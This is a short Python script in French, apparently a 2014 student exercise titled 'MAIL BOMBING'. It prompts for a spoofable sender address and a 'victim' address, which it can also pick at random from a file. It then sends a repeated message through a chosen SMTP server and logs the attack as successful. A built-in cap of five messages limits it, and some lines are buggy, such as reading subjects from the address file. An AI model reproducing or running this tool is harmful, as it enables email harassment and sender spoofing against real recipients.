#!/usr/bin/python
# -*- coding: utf-8 -*-

#fichier: TP5.py
#Auteur: Machut Antony
#Date : 26 novembre 2014

#---------- imports ----------

import smtplib
import os,sys
import time
import logging
import random
import linecache
import email
import email.mime.application 
import mimetypes
from email.mime.application import MIMEApplication
from logging.handlers import RotatingFileHandler
from datetime import datetime
from email.mime.base import MIMEBase
from email.mime.audio import MIMEAudio
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email import encoders
from os.path import basename
from optparse import OptionParser
from email.message import Message

#---------- Programme Principal ----------

print("+--------------------------------------+")
print("|     MAIL BOMBING - Machut Antony     |")
print("+--------------------------------------+")

# Initialisation des paramètres
SOURCE = input("Adresse E-Mail Source : ")
choix_victime= input("Voulez-vous choisir une cible définie ou laisser le hasard décider ? [ Choisir : 1 ] ")
if ( int(choix_victime) == 1):
	VICTIME = input("Adresse E-Mail Victime : ")
else:
	nom_fichier_mail = input("	Quel fichier contient les adresses mail ? ")
	fichierMail = open(nom_fichier_mail, "r")
	n = 0
	for line in fichierMail:
    	 n += 1
	random = random.randint(1,n)
	VICTIME = linecache.getline(nom_fichier_mail, random)
	print ('	Adresse mail choisie : ', VICTIME)
	fichierMail.close()

choix_sujet = input("Voulez-vous choisir un sujet défini ainsi que le corps du message ou laisser le hasard décider ? [ Choisir : 1 ] ")
if ( int(choix_sujet) == 1):
	SUJET = input("SUJET : ")
	MESSAGE = input("MESSAGE : ")
else:
	nom_fichier_sujet = input("	Quel fichier contient le sujet ? ")
	fichierSujet = open(nom_fichier_sujet, "r")
	nom_fichier_message = input("	Quel fichier contient les messages ? ")
	fichierMessage = open(nom_fichier_message, "r")
	n = 0
	for line in fichierSujet:
    	 n += 1
	random = random.randint(1,n)
	SUJET = linecache.getline(nom_fichier_mail, random)
	print ('	Sujet choisi : ', SUJET)
	n = 0
	for line in fichierMessage:
    	 n += 1
	MESSAGE = linecache.getline(nom_fichier_mail, random)
	print ('	Message choisi : ', MESSAGE)
	fichierSujet.close()
	fichierMessage.close()

DATE = input("DATE : ")

mail = MIMEMultipart()
mail = MIMEText(MESSAGE)
mail['From'] = SOURCE
mail['Subject'] = SUJET
mail['To'] = VICTIME
mail['Date'] = DATE

NB_MAIL = int(input("Combien de mail voulez-vous envoyer ? : "))
if (NB_MAIL > 5):
	print("Pour des raisons de sécurité, nous vous limitons à 5 mails.")
	NB_MAIL = 5

SMTP = input("Serveur SMTP : ")
serv = smtplib.SMTP(SMTP)

NB_MAIL_ENVOYE = 0
while (NB_MAIL > 0):
	serv.send_message(mail)
	print("Message envoyé - Restant [", NB_MAIL,"]")
	NB_MAIL = NB_MAIL - 1
	NB_MAIL_ENVOYE = NB_MAIL_ENVOYE + 1

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s :: %(levelname)s :: %(message)s')
file_handler = RotatingFileHandler('maim_bombing.log', 'a', 1000000, 1)
file_handler.setLevel(logging.DEBUG)
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)
steam_handler = logging.StreamHandler()
steam_handler.setLevel(logging.DEBUG)
logger.addHandler(steam_handler)
logger.info("Envoie d'un mail bombing réussi :")
logger.info(SOURCE)
logger.info(VICTIME)
logger.info(SUJET)
logger.info(MESSAGE)
logger.info(NB_MAIL_ENVOYE)
logger.warning('Testing %s', 'foo')

print("Opération terminée")
serv.quit()

